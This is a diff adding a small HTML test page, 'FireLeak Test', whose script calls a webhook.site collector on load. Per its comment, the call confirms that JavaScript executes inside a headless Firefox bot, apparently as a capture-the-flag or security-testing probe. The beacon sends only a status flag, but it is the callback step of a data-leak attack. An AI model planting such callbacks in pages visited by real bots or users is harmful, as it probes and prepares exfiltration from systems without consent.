@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<body>
+<h1>FireLeak Test</h1>
+
+<script>
+(async () => {
+  // Prove JS is executed inside the headless Firefox bot
+  await fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?status=js_running");
+})();
+</script>
+
+</body>
+</html>
